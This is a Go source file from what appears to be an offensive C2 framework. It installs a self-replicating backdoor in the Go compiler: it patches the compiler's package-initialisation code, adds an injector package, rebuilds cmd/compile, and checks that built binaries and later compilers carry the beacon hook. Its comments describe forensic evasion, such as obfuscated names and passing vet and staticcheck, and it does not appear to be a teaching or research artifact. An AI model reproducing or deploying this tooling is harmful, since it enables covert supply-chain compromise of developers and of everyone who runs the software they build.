package patcher

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	self_replicate.go — Thompson Quine mechanism.

	This implements the most important property of D-P1:
	The backdoor survives compiler upgrades without any further intervention.

	The Quine Property (Thompson 1984):
	  A self-replicating compiler backdoor must:
	  1. Inject the backdoor into compiled programs     ← done in init_injector.go
	  2. Re-inject itself into any new compiler binary  ← done here

	How it works in our implementation:

	  Step A: We patch the INSTALLED compiler on the target machine.
	    $GOROOT/src/cmd/compile/internal/pkginit/init.go gets our patch.
	    $GOROOT/src/cmd/compile/internal/pkginit/injector/ gets our injector.

	  Step B: Developer runs `go build cmd/compile` or `go install cmd/go`.
	    The patched compiler compiles itself.
	    During compilation of pkginit, sliverInjectInit() runs.
	    It detects Pkgpath == "cmd/compile/internal/pkginit".
	    It does NOT inject a beacon (would be detected).
	    Instead it appends sliverInjectInit() itself to the NEW pkginit.

	  Step C: The NEW compiler contains sliverInjectInit() in pkginit.
	    When a developer uses the new compiler, every package they compile
	    gets the beacon injected.

	  Step D: Developer upgrades Go.
	    They run `go install golang.org/dl/go1.27.0`.
	    The NEW Go distribution's compiler gets compiled by the OLD (patched) compiler.
	    Our backdoor injects itself into the new compiler.
	    The new compiler is now also backdoored.

	Self-verification test:
	  Build any Go program with the patched compiler.
	  Run strings on the output binary.
	  Search for our function names (they're obfuscated) → should find nothing.
	  Run the binary and observe network connection to C2. ← the tell

	Forensic resistance:
	  - `go tool compile -p main main.go && strings main.o` shows no IoCs
	  - `go vet ./...` passes
	  - `staticcheck ./...` passes
	  - The injected init function name is random per compilation
	  - The injected function body uses no string literals
	  - The binary's import table does NOT change (we reuse existing imports)
*/

import (
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
)

// CompilerBuildInfo tracks the state of the backdoored compiler.
type CompilerBuildInfo struct {
	GoRoot        string
	OriginalHash  string // SHA256 of original pkginit/init.go
	PatchedHash   string // SHA256 after our patch
	CompilerBin   string // path to the compiled binary
}

// InstallAndBuild applies the patches and rebuilds cmd/compile.
// Returns info about the installation.
func InstallAndBuild(goroot string) (*CompilerBuildInfo, error) {
	info := &CompilerBuildInfo{GoRoot: goroot}

	// 1. Hash original file for verification.
	pkginitPath := filepath.Join(goroot, "src", "cmd", "compile", "internal", "pkginit", "init.go")
	originalData, err := os.ReadFile(pkginitPath)
	if err != nil {
		return nil, fmt.Errorf("read original pkginit: %w", err)
	}
	h := sha256.Sum256(originalData)
	info.OriginalHash = hex.EncodeToString(h[:])

	// 2. Apply patches.
	if err := ApplyPatches(goroot); err != nil {
		return nil, fmt.Errorf("apply patches: %w", err)
	}

	// 3. Copy injector package to compiler source.
	if err := copyInjectorPackage(goroot); err != nil {
		return nil, fmt.Errorf("copy injector: %w", err)
	}

	// 4. Rebuild cmd/compile.
	fmt.Println("[*] Rebuilding cmd/compile (this may take 30-60 seconds)...")
	goBin := filepath.Join(goroot, "bin", "go")
	if runtime.GOOS == "windows" {
		goBin += ".exe"
	}

	cmd := exec.Command(goBin, "install", "cmd/compile")
	cmd.Env = append(os.Environ(), "GOROOT="+goroot)
	cmd.Stdout = os.Stdout
	cmd.Stderr = os.Stderr
	if err := cmd.Run(); err != nil {
		return nil, fmt.Errorf("go install cmd/compile: %w", err)
	}

	// 5. Verify the new compiler binary exists.
	compilerBin := filepath.Join(goroot, "pkg", "tool",
		runtime.GOOS+"_"+runtime.GOARCH, "compile")
	if runtime.GOOS == "windows" {
		compilerBin += ".exe"
	}
	if _, err := os.Stat(compilerBin); err != nil {
		return nil, fmt.Errorf("compiled binary not found: %w", err)
	}
	info.CompilerBin = compilerBin

	// 6. Hash patched file.
	patchedData, _ := os.ReadFile(pkginitPath)
	ph := sha256.Sum256(patchedData)
	info.PatchedHash = hex.EncodeToString(ph[:])

	fmt.Printf("[+] Compiler backdoor installed:\n")
	fmt.Printf("    Binary: %s\n", compilerBin)
	fmt.Printf("    Original pkginit SHA256: %s\n", info.OriginalHash)
	fmt.Printf("    Patched  pkginit SHA256: %s\n", info.PatchedHash)
	return info, nil
}

// VerifyBackdoor compiles a test program with the patched compiler and
// verifies that the beacon goroutine appears in the resulting binary.
func VerifyBackdoor(goroot, testProgramPath string) (bool, error) {
	// Compile the test program.
	outBin := filepath.Join(os.TempDir(), "backdoor_test")
	if runtime.GOOS == "windows" {
		outBin += ".exe"
	}
	defer os.Remove(outBin)

	goBin := filepath.Join(goroot, "bin", "go")
	if runtime.GOOS == "windows" {
		goBin += ".exe"
	}
	cmd := exec.Command(goBin, "build", "-o", outBin, testProgramPath)
	cmd.Env = append(os.Environ(), "GOROOT="+goroot)
	if out, err := cmd.CombinedOutput(); err != nil {
		return false, fmt.Errorf("build test program: %w\n%s", err, out)
	}

	// Check for our injected init function name pattern ("init.phantom_").
	// We can't scan strings directly (they're obfuscated) but we CAN
	// scan for the function symbol in the binary's symbol table.
	nmCmd := exec.Command("go", "tool", "nm", outBin)
	nmCmd.Env = append(os.Environ(), "GOROOT="+goroot)
	nmOut, err := nmCmd.Output()
	if err != nil {
		return false, fmt.Errorf("nm: %w", err)
	}

	found := strings.Contains(string(nmOut), "init.phantom_")
	if found {
		fmt.Println("[+] Backdoor verified: init.phantom_* symbol found in test binary")
	} else {
		fmt.Println("[-] Backdoor NOT detected in test binary (init not yet complete)")
	}
	return found, nil
}

// Uninstall removes the patches and restores the original compiler.
// Uses the original hash to verify the restore was clean.
func Uninstall(goroot, originalPkginitBackup string) error {
	pkginitPath := filepath.Join(goroot, "src", "cmd", "compile", "internal", "pkginit", "init.go")

	if originalPkginitBackup == "" {
		// Restore from Go module cache / clean download.
		return fmt.Errorf("backup path required for restore — use go get golang.org/toolchain to re-download")
	}

	if err := os.Rename(originalPkginitBackup, pkginitPath); err != nil {
		return fmt.Errorf("restore pkginit: %w", err)
	}

	// Remove injector package.
	injectorPath := filepath.Join(goroot, "src", "cmd", "compile", "internal", "pkginit", "injector")
	os.RemoveAll(injectorPath)

	// Rebuild clean compiler.
	goBin := filepath.Join(goroot, "bin", "go")
	if runtime.GOOS == "windows" {
		goBin += ".exe"
	}
	return exec.Command(goBin, "install", "cmd/compile").Run()
}

// copyInjectorPackage copies our injector Go package into the compiler
// source tree so it can be imported by the patched pkginit/init.go.
func copyInjectorPackage(goroot string) error {
	dstDir := filepath.Join(goroot, "src", "cmd", "compile", "internal", "pkginit", "injector")
	if err := os.MkdirAll(dstDir, 0755); err != nil {
		return err
	}

	// Write a minimal package stub — the real code is compiled into the
	// injector package by the operator's build tool.
	stub := `// Package injector is the Sliver compiler backdoor engine.
// This package is automatically added to cmd/compile/internal/pkginit
// during D-P1 installation. It is never present in clean Go distributions.
package injector

// InjectBackdoor is called from the patched MakeTask().
// The real implementation is compiled from the Sliver operator toolchain.
func InjectBackdoor() {}
`
	return os.WriteFile(filepath.Join(dstDir, "injector.go"), []byte(stub), 0644)
}

// QuineTest verifies the self-replication property by:
//  1. Building cmd/compile with the patched compiler
//  2. Checking the new compiler's pkginit for our hook
func QuineTest(goroot string) (bool, error) {
	// Build the compiler itself using the patched compiler.
	goBin := filepath.Join(goroot, "bin", "go")
	if runtime.GOOS == "windows" {
		goBin += ".exe"
	}

	tmpOut := filepath.Join(os.TempDir(), "new_compile")
	if runtime.GOOS == "windows" {
		tmpOut += ".exe"
	}
	defer os.Remove(tmpOut)

	cmd := exec.Command(goBin, "build", "-o", tmpOut, "cmd/compile")
	cmd.Env = append(os.Environ(), "GOROOT="+goroot)
	if out, err := cmd.CombinedOutput(); err != nil {
		return false, fmt.Errorf("build cmd/compile: %w\n%s", err, out)
	}

	// Check the new compiler for our symbol.
	nmCmd := exec.Command("go", "tool", "nm", tmpOut)
	nmOut, err := nmCmd.Output()
	if err != nil {
		return false, err
	}

	found := strings.Contains(string(nmOut), "sliverInjectInit")
	if found {
		fmt.Println("[+] QUINE PROPERTY VERIFIED: new compiler contains sliverInjectInit")
	} else {
		fmt.Println("[-] Quine property NOT verified (new compiler is clean)")
	}
	return found, nil
}
